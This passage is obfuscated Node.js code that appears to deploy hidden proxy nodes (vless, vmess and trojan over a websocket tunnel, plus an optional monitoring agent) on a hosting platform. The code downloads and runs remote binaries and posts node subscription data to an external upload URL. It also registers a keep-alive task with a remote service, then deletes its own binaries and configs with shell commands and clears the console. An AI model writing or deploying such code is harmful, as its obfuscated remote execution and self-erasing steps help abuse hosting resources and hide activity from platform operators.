_0x5ef01b(_0x3f8734){const _0x3aec3b={_0x252bcf:0xdd,_0x5baa5e:0xa7,_0x5a8aae:0x10d,_0x3683a9:0xc3,_0x37a7ec:0x9f,_0x32025f:0x11b,_0xdeeb5e:0x13b,_0x2ac38e:0xd4,_0x35ab06:0xf7,_0x1f9ad0:0x132,_0x2b42d4:0xf7,_0x2f3523:0x118},_0x27f2a8=await _0x252831(),_0x29d5c2=NAME?NAME+'-'+_0x27f2a8:_0x27f2a8;return new Promise(_0x53b3e7=>{const _0xb22c9c={_0x11d199:0xd4};setTimeout(()=>{const _0xf0d8d1=_0x307d,_0x463a4f={'v':'2','ps':''+_0x29d5c2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xf0d8d1(0x8e),'net':'ws','type':_0xf0d8d1(_0x3aec3b._0x252bcf),'host':_0x3f8734,'path':_0xf0d8d1(0x104),'tls':_0xf0d8d1(0x117),'sni':_0x3f8734,'alpn':'','fp':'firefox'},_0x4e1347=_0xf0d8d1(_0x3aec3b._0x5baa5e)+UUID+'@'+CFIP+':'+CFPORT+_0xf0d8d1(0x107)+_0x3f8734+_0xf0d8d1(_0x3aec3b._0x5a8aae)+_0x3f8734+_0xf0d8d1(_0x3aec3b._0x3683a9)+_0x29d5c2+_0xf0d8d1(0x11d)+Buffer['from'](JSON[_0xf0d8d1(0x12e)](_0x463a4f))['toString'](_0xf0d8d1(0xf7))+_0xf0d8d1(0x106)+UUID+'@'+CFIP+':'+CFPORT+_0xf0d8d1(_0x3aec3b._0x37a7ec)+_0x3f8734+_0xf0d8d1(0x10d)+_0x3f8734+_0xf0d8d1(_0x3aec3b._0x32025f)+_0x29d5c2+_0xf0d8d1(_0x3aec3b._0xdeeb5e);console['log'](Buffer[_0xf0d8d1(0x132)](_0x4e1347)[_0xf0d8d1(_0x3aec3b._0x2ac38e)](_0xf0d8d1(_0x3aec3b._0x35ab06))),fs[_0xf0d8d1(0xcd)](subPath,Buffer[_0xf0d8d1(_0x3aec3b._0x1f9ad0)](_0x4e1347)['toString'](_0xf0d8d1(_0x3aec3b._0x2b42d4))),console[_0xf0d8d1(0x99)](FILE_PATH+_0xf0d8d1(0x13a)),uploadNodes(),app[_0xf0d8d1(_0x3aec3b._0x2f3523)]('/'+SUB_PATH,(_0x2d923e,_0xa6e444)=>{const _0x53addb=_0xf0d8d1,_0x128428=Buffer[_0x53addb(0x132)](_0x4e1347)[_0x53addb(_0xb22c9c._0x11d199)]('base64');_0xa6e444['set']('Content-Type',_0x53addb(0xce)),_0xa6e444['send'](_0x128428);}),_0x53b3e7(_0x4e1347);},0x7d0);});}}async function uploadNodes(){const _0x2a9a5e={_0x53d3a9:0xfb,_0x426d69:0x99,_0x5df6c5:0xac,_0x593310:0xf1,_0x143bcd:0x12d},_0x132239=_0x1631e5;if(UPLOAD_URL&&PROJECT_URL){const _0x37c878=PROJECT_URL+'/'+SUB_PATH,_0x11f674={'subscription':[_0x37c878]};try{const _0x4da8f0=await axios[_0x132239(0x90)](UPLOAD_URL+_0x132239(0x113),_0x11f674,{'headers':{'Content-Type':_0x132239(0xf0)}});return _0x4da8f0&&_0x4da8f0[_0x132239(_0x2a9a5e._0x53d3a9)]===0xc8?(console[_0x132239(_0x2a9a5e._0x426d69)](_0x132239(0xe5)),_0x4da8f0):null;}catch(_0x589727){if(_0x589727[_0x132239(0x9b)]){if(_0x589727[_0x132239(0x9b)][_0x132239(0xfb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x41ff7e=fs['readFileSync'](listPath,'utf-8'),_0x568741=_0x41ff7e[_0x132239(0x93)]('\x0a')[_0x132239(_0x2a9a5e._0x5df6c5)](_0x2c7919=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x132239(0xd3)](_0x2c7919));if(_0x568741[_0x132239(0x133)]===0x0)return;const _0x1644dc=JSON[_0x132239(0x12e)]({'nodes':_0x568741});try{const _0x24dc63=await axios[_0x132239(0x90)](UPLOAD_URL+_0x132239(_0x2a9a5e._0x593310),_0x1644dc,{'headers':{'Content-Type':_0x132239(0xf0)}});return _0x24dc63&&_0x24dc63[_0x132239(0xfb)]===0xc8?(console[_0x132239(0x99)](_0x132239(_0x2a9a5e._0x143bcd)),_0x24dc63):null;}catch(_0xbb67e2){return null;}}else return;}}function cleanFiles(){const _0x411784={_0x3222c3:0x122,_0x21988a:0xca,_0x42599c:0xb4},_0x1db0ed={_0x5bc439:0x99,_0x28a234:0x92};setTimeout(()=>{const _0x5ee619={_0x243e49:0x140,_0x236277:0x130,_0x103e4b:0x99,_0x15548d:0x92},_0x3a6517=_0x307d,_0x1ab3b5=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1ab3b5[_0x3a6517(0x122)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1ab3b5[_0x3a6517(_0x411784._0x3222c3)](phpPath);process[_0x3a6517(0xda)]===_0x3a6517(_0x411784._0x21988a)?exec(_0x3a6517(0xc8)+_0x1ab3b5[_0x3a6517(_0x411784._0x42599c)]('\x20')+'\x20>\x20nul\x202>&1',_0x45ae71=>{const _0x482719=_0x3a6517;console['clear'](),console[_0x482719(_0x1db0ed._0x5bc439)]('App\x20is\x20running'),console['log'](_0x482719(_0x1db0ed._0x28a234));}):exec(_0x3a6517(0xd2)+_0x1ab3b5['join']('\x20')+'\x20>/dev/null\x202>&1',_0x33be3a=>{const _0x40e036=_0x3a6517;console[_0x40e036(_0x5ee619._0x243e49)](),console['log'](_0x40e036(_0x5ee619._0x236277)),console[_0x40e036(_0x5ee619._0x103e4b)](_0x40e036(_0x5ee619._0x15548d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4f70f3={_0x4ba100:0x90,_0x2f6a17:0x99,_0x45bc3c:0x13d},_0x3fab8b=_0x1631e5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3fab8b(0x99)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x7f929c=await axios[_0x3fab8b(_0x4f70f3._0x4ba100)](_0x3fab8b(0x95),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3fab8b(0xf0)}});return console[_0x3fab8b(_0x4f70f3._0x2f6a17)]('automatic\x20access\x20task\x20added\x20successfully'),_0x7f929c;}catch(_0x402433){return console[_0x3fab8b(0x143)](_0x3fab8b(_0x4f70f3._0x45bc3c)+_0x402433[_0x3fab8b(0xec)]),null;}}async function startserver(){const _0x21c99f={_0x36118e:0x144},_0xc16046=_0x1631e5;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5166a9){console[_0xc16046(0x143)](_0xc16046(_0x21c99f._0x36118e),_0x5166a9);}}startserver()[_0x1631e5(0xe4)](_0x4bbb27=>{const _0xab9018={_0x537926:0x143},_0xd41793=_0x1631e5;console[_0xd41793(_0xab9018._0x537926)](_0xd41793(0xb7),_0x4bbb27);}),app[_0x1631e5(0x118)]('/',async function(_0x5a5f64,_0x4b9745){const _0xb491ec={_0x54d51f:0xad,_0x3b912e:0xe3,_0x5c4e78:0x137},_0x20b64b=_0x1631e5;try{const _0x5a5e42=path[_0x20b64b(0xb4)](__dirname,'index.html'),_0x556430=await fs[_0x20b64b(0x110)][_0x20b64b(_0xb491ec._0x54d51f)](_0x5a5e42,_0x20b64b(_0xb491ec._0x3b912e));_0x4b9745['send'](_0x556430);}catch(_0x22665b){_0x4b9745[_0x20b64b(_0xb491ec._0x5c4e78)]('Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!');}}),app[_0x1631e5(0x129)](PORT,()=>console['log'](_0x1631e5(0x136)+PORT+'!'));
